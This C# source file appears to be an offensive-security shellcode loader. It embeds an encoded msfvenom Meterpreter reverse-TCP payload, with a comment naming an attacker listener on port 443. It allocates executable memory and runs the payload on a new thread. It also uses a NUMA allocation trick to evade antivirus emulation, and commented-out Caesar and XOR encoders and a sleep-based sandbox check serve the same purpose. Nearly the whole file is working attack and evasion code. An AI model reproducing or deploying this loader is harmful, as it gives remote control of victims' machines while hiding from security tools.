using System;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            //Sleep
            //DateTime t1 = DateTime.Now;
            //Sleep(2000);
            //double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //if (t2 < 1.5)
            //{
            //    return;
            //}

            //Non-Emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp
            byte[] buf = new byte[510] { 0xff, 0x4b, 0x86, 0xe7, 0xf3, 0xeb, 0xcf, 0x03, 0x03, 0x03, 0x44, 0x54, 0x44, 0x53, 0x55, 0x54, 0x59, 0x4b, 0x34, 0xd5, 0x68, 0x4b, 0x8e, 0x55, 0x63, 0x4b, 0x8e, 0x55, 0x1b, 0x4b, 0x8e, 0x55, 0x23, 0x50, 0x34, 0xcc, 0x4b, 0x12, 0xba, 0x4d, 0x4d, 0x4b, 0x8e, 0x75, 0x53, 0x4b, 0x34, 0xc3, 0xaf, 0x3f, 0x64, 0x7f, 0x05, 0x2f, 0x23, 0x44, 0xc4, 0xcc, 0x10, 0x44, 0x04, 0xc4, 0xe5, 0xf0, 0x55, 0x44, 0x54, 0x4b, 0x8e, 0x55, 0x23, 0x8e, 0x45, 0x3f, 0x4b, 0x04, 0xd3, 0x69, 0x84, 0x7b, 0x1b, 0x0e, 0x05, 0x12, 0x88, 0x75, 0x03, 0x03, 0x03, 0x8e, 0x83, 0x8b, 0x03, 0x03, 0x03, 0x4b, 0x88, 0xc3, 0x77, 0x6a, 0x4b, 0x04, 0xd3, 0x47, 0x8e, 0x43, 0x23, 0x4c, 0x04, 0xd3, 0x53, 0x8e, 0x4b, 0x1b, 0xe6, 0x59, 0x4b, 0x02, 0xcc, 0x50, 0x34, 0xcc, 0x44, 0x8e, 0x37, 0x8b, 0x4b, 0x04, 0xd9, 0x4b, 0x34, 0xc3, 0x44, 0xc4, 0xcc, 0x10, 0xaf, 0x44, 0x04, 0xc4, 0x3b, 0xe3, 0x78, 0xf4, 0x4f, 0x06, 0x4f, 0x27, 0x0b, 0x48, 0x3c, 0xd4, 0x78, 0xdb, 0x5b, 0x47, 0x8e, 0x43, 0x27, 0x4c, 0x04, 0xd3, 0x69, 0x44, 0x8e, 0x0f, 0x4b, 0x47, 0x8e, 0x43, 0x1f, 0x4c, 0x04, 0xd3, 0x44, 0x8e, 0x07, 0x8b, 0x44, 0x5b, 0x4b, 0x04, 0xd3, 0x44, 0x5b, 0x61, 0x5c, 0x5d, 0x44, 0x5b, 0x44, 0x5c, 0x44, 0x5d, 0x4b, 0x86, 0xef, 0x23, 0x44, 0x55, 0x02, 0xe3, 0x5b, 0x44, 0x5c, 0x5d, 0x4b, 0x8e, 0x15, 0xec, 0x4e, 0x02, 0x02, 0x02, 0x60, 0x4c, 0xc1, 0x7a, 0x76, 0x35, 0x62, 0x36, 0x35, 0x03, 0x03, 0x44, 0x59, 0x4c, 0x8c, 0xe9, 0x4b, 0x84, 0xef, 0xa3, 0x04, 0x03, 0x03, 0x4c, 0x8c, 0xe8, 0x4c, 0xbf, 0x05, 0x03, 0x04, 0xbe, 0xc3, 0xab, 0x30, 0xce, 0x44, 0x57, 0x4c, 0x8c, 0xe7, 0x4f, 0x8c, 0xf4, 0x44, 0xbd, 0x4f, 0x7a, 0x29, 0x0a, 0x02, 0xd8, 0x4f, 0x8c, 0xed, 0x6b, 0x04, 0x04, 0x03, 0x03, 0x5c, 0x44, 0xbd, 0x2c, 0x83, 0x6e, 0x03, 0x02, 0xd8, 0x6d, 0x0d, 0x44, 0x61, 0x53, 0x53, 0x50, 0x34, 0xcc, 0x50, 0x34, 0xc3, 0x4b, 0x02, 0xc3, 0x4b, 0x8c, 0xc5, 0x4b, 0x02, 0xc3, 0x4b, 0x8c, 0xc4, 0x44, 0xbd, 0xed, 0x12, 0xe2, 0xe3, 0x02, 0xd8, 0x4b, 0x8c, 0xca, 0x6d, 0x13, 0x44, 0x5b, 0x4f, 0x8c, 0xe5, 0x4b, 0x8c, 0xfc, 0x44, 0xbd, 0x9c, 0xa8, 0x77, 0x64, 0x02, 0xd8, 0x88, 0xc3, 0x77, 0x0d, 0x4c, 0x02, 0xd1, 0x78, 0xe8, 0xeb, 0x96, 0x03, 0x03, 0x03, 0x4b, 0x86, 0xef, 0x13, 0x4b, 0x8c, 0xe5, 0x50, 0x34, 0xcc, 0x6d, 0x07, 0x44, 0x5b, 0x4b, 0x8c, 0xfc, 0x44, 0xbd, 0x05, 0xdc, 0xcb, 0x62, 0x02, 0xd8, 0x86, 0xfb, 0x03, 0x81, 0x58, 0x4b, 0x86, 0xc7, 0x23, 0x61, 0x8c, 0xf9, 0x6d, 0x43, 0x44, 0x5c, 0x6b, 0x03, 0x13, 0x03, 0x03, 0x44, 0x5b, 0x4b, 0x8c, 0xf5, 0x4b, 0x34, 0xcc, 0x44, 0xbd, 0x5b, 0xa7, 0x56, 0xe8, 0x02, 0xd8, 0x4b, 0x8c, 0xc6, 0x4c, 0x8c, 0xca, 0x50, 0x34, 0xcc, 0x4c, 0x8c, 0xf3, 0x4b, 0x8c, 0xdd, 0x4b, 0x8c, 0xfc, 0x44, 0xbd, 0x05, 0xdc, 0xcb, 0x62, 0x02, 0xd8, 0x86, 0xfb, 0x03, 0x80, 0x2b, 0x5b, 0x44, 0x5a, 0x5c, 0x6b, 0x03, 0x43, 0x03, 0x03, 0x44, 0x5b, 0x6d, 0x03, 0x5d, 0x44, 0xbd, 0x0e, 0x32, 0x12, 0x33, 0x02, 0xd8, 0x5a, 0x5c, 0x44, 0xbd, 0x78, 0x71, 0x50, 0x64, 0x02, 0xd8, 0x4c, 0x02, 0xd1, 0xec, 0x3f, 0x02, 0x02, 0x02, 0x4b, 0x04, 0xc6, 0x4b, 0x2c, 0xc9, 0x4b, 0x88, 0xf9, 0x78, 0xb7, 0x44, 0x02, 0xea, 0x5b, 0x6d, 0x03, 0x5c, 0x4c, 0xca, 0xc5, 0xf3, 0xb8, 0xa5, 0x59, 0x02, 0xd8 };

            int size = buf.Length;

            // Caesar Encoding
            //byte[] encoded = new byte[buf.Length];
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    encoded[i] = (byte)(((uint)buf[i] + 6) & 0xFF);
            //}
            //StringBuilder hex = new StringBuilder(encoded.Length * 2);
            //foreach (byte b in encoded)
            //{
            //    hex.AppendFormat("0x{0:x2}, ", b);
            //}
            //Console.WriteLine("The payload is: " + hex.ToString());

            // Caesar Decoding
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 6) & 0xFF);
            //}

            // XOR Encoding
            //byte[] encoded = new byte[buf.Length];
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    encoded[i] = (byte)(buf[i] ^ 0xAA);
            //}
            //StringBuilder hex = new StringBuilder(encoded.Length * 2);
            //foreach (byte b in encoded)
            //{
            //    hex.AppendFormat("0x{0:x2}, ", b);
            //}
            //Console.WriteLine("The payload is: " + hex.ToString());

            // XOR Decoding
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(buf[i] ^ 0xAA);
            //}

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
